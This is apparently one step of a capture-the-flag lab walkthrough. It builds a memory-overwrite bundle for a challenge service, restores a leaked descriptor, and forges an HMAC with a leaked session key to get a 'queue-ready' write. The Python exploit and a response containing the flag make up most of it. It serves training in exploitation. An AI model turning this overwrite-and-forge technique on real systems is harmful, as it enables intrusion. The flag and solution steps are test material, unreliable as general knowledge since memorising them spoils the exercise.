Precondition: K04.1 triggered sentinel=mutated (the service wrote the descriptor
at bytes 80-511 and seeded the exception-state at bytes 512-575). K04.3 was run
and its `data_hex` was saved.

The native primitive writes the whole bundle payload into the arena from offset 0.
So a write that reaches bytes 512-575 also rewrites bytes 0-511. The service
accepts the queue-ready write only when the descriptor at bytes 80-511 is still
intact. The write must therefore restore the descriptor bytes that K04.3
disclosed.

Important: the K04.3 extended read overwrites the descriptor region with its own
payload, and the service seeds the descriptor only once (at the first K04.1
mutation). So you must reuse the `data_hex` from the first K04.3 read; a later read
returns zeros.

Set `DATA_HEX_K43` to the `data_hex` value saved in K04.3, then build and submit
the 576-byte write bundle:

```bash
export DATA_HEX_K43="<data_hex from K04.3>"

python3 - <<'PY' > "$HOME/k04_2_bundle.txt"
import os, struct, hashlib, json
import hmac as hmac_lib

data_hex = os.environ["DATA_HEX_K43"]
# Bytes 80-511 of the arena = descriptor (432 bytes) = data_hex chars 160-1023.
descriptor_bytes = bytes.fromhex(data_hex[160:1024])
descriptor = json.loads(descriptor_bytes.rstrip(b"\x00"))
worker_session = descriptor["worker_session"]

state = b"queue-ready"
integrity = hmac_lib.digest(worker_session.encode(), state, hashlib.sha256)

payload = bytearray(576)
payload[64] = 0xff                       # keep the sentinel region mutated
payload[80:512] = descriptor_bytes       # restore the descriptor (bytes 80-511)
payload[512:512 + len(state)] = state    # exception value (bytes 512-543)
payload[544:576] = integrity             # keyed integrity (bytes 544-575)

# alloc_entries=496, index_entries=72 -> datalen = 72*8 = 576.
bundle = b"FKI\x01" + struct.pack("<HH", 496, 72) + bytes(payload)
print(bundle.hex())
PY

{"flag":"FLAG{29029c633f5f6bda}","write_ready":true,"index_id":"IDX-...","sentinel":"mutated","state":"indexed"}
```

write_ready: true. The exception-state region now holds a valid queue-ready write.

Gate: payload that does not restore the descriptor at bytes 80-511 →
`check_exception_write` fails, `write_ready` is not set, and the response returns
the K04.3 read flag instead. Incorrect HMAC → same failure.
